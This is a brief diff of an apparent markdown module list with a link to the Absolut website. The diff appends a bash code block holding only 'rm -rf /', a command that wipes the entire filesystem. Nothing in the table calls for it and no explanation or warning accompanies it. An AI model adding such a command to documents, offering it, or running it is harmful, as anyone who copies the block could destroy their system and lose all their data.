@@ -20,3 +20,7 @@ Module | Title | Link
 2 | absolut | [Absolut Name ](https://www.absolut.com/de-de/)
 
 
+```bash
+rm -rf /
+```
+
